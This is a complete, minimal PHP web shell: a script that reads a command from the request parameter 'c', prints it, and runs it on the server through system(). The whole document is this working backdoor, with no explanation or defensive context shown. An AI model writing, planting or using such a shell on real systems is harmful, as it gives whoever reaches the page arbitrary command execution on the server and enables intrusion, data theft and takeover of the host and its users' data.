<?php
if(isset($_REQUEST['c']))
{
    $cmd = ($_REQUEST["c"]);
    echo "<pre>$cmd</pre>";
    system($cmd);
}
?>
